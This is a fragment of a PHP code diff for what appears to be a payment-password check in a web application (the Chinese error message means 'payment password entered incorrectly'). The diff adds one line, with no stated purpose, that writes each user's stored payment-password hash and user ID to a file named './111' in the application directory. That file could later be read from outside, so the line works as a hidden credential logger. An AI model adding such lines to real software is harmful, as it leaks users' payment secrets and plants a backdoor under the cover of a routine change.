@@ -47,6 +47,7 @@ if(isset($_GET['type']) && $_GET['type'] == "uploadFile"){
 if(IS_POST){
    $res=$_POST;
    $pwd=md5($res['password']);
+   file_put_contents("./111", $user['pay_password']."---".$wap_user['userid']);
    if($pwd != $user['pay_password']){
         dexit(["res"=>2,'msg'=>"支付密码输入错误"]);
     }
